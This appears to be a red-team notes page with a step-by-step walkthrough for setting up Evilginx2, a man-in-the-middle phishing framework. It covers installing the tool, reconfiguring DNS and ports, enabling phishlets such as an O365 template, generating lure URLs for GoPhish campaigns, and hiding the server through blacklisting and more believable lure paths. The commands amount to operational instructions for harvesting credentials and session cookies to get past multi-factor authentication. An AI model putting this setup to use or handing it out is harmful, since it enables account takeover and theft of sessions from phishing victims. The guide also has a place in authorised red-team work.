# Evilginx - MFA Bypass

## Evilginx

{% embed url="https://github.com/kgretzky/evilginx2" %}

> **Evilginx** is a man-in-the-middle attack framework used for phishing login credentials along with session cookies, which in turn allows to bypass 2-factor authentication protection.

#### Installation

```bash
git clone https://github.com/kgretzky/evilginx2.git

cd evilginx2/

go build
```



## DNS Fixes

Evilginx use the port 53, for this reason we can stop any service that run in this port.

**Check if the port is used**

```bash
sudo lsof -i :53
```

**Stop the systemd-resolved service** if it's running.

```bash
sudo systemctl stop systemd-resolved.service
```

Recreate the /etc/resolv.conf file for the evilginx tool.

```bash
sudo rm /etc/resolv.conf

sudo nano /etc/resolv.conf
```

Insert this new content in the resolv.conf file.

```
nameserver 1.1.1.1
nameserver 8.8.8.8
```

Save the file and exit

Create a firewall rules that open the port 53 to all internet.

**Test DNS by doing:**

```bash
ping google.com
```



## Run and Setup Evilginx

Change the GoPhish configuration

```
cd gophish/
sudo config.json
```

Change the `listen_url` field port from `443` to `8080` becouse evilginx will use that port. And then restart gophish service.

```bash
sudo systemctl stop gophish.service
sudo systemctl start gophish.service
```

Enter in the evilginx directory and open tmux session to start the tool

```bash
cd evilginx/
tmux

sudo ./evilginx2
```

Setup our phishing domain and phishing server public IP on evilginx

{% code title="evilginx console" %}
```
config domain phishingdomain.com
config ipv4 external <IPV4>
```
{% endcode %}



## Setting Up Domains for Phishlets

**Ensure your firewall rules for port 443, port 53 (TCP/UDP), port 80 are open to the internet (0.0.0.0/0)**

Check your phishlet file to see all of the "phish\_sub" parameters

```bash
cd evilginx2/phishlets
cat example.yaml # or other phishlets file
```

**Setup a DNS "A Record" for all subdomains of the phishlet (academy subdom for the example phishlet)**\


**Run Phishlet and configure the phishlet**

```bash
tmux
sudo ./evilginx2

phishlets hostname <phishletName> <mydomain.com>
phishlets enable <phishletName>
```

<figure><img src="../../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

**Create a lure:**

```
lures create <phishletName>
lures get-url <idOfLure>
```

<figure><img src="../../../../.gitbook/assets/image (15).png" alt="" width="375"><figcaption></figcaption></figure>



## Running a Custom Phishlet

To run a custom phishlet we have to run evilginx2 and then follow next commands

1. Find a phishlet for the service that we want use from github

{% embed url="https://github.com/ArchonLabs/evilginx2-phishlets/tree/master/phishlets" %}

2. Copy the .yaml content of the chose phishlet from github in the `evilginx2/phishlet` directory.

```bash
nano o365.yaml
```

3. Populate DNS "A records" for all phishlet subdomains (highlights in the next screenshot).

<figure><img src="../../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

4. Restart evilginx2, give to the new phishlet a hostname and enable this new phishlet.

```
sudo ./evilginx2

: phishlets hostname <phishletName> domain.com
: phishlets enable <phishletName> 
```

5. Create a lures with new phishlet

```
lures create <phishletName> 
lures get-url <idOfLure>
```

The output of the last command is the URL to use in a phishing campaign.

## Integration with GoPhish

When we have a lures URL, we can put it in the URL field when we create a new campaign on GoPhish.

<figure><img src="../../../../.gitbook/assets/image (11).png" alt="" width="350"><figcaption></figcaption></figure>



## Protecting Evilginx <a href="#lecture_heading" id="lecture_heading"></a>

#### Blacklist function

Black list function is used to block all user that not access via phishlet to the domain.

{% code title="evilginx2 console" %}
```
blacklist all
```
{% endcode %}



#### Change Lures Path

Change the default lures path with a name more credible.

```
lures edit <luredId> path <newpath>
```

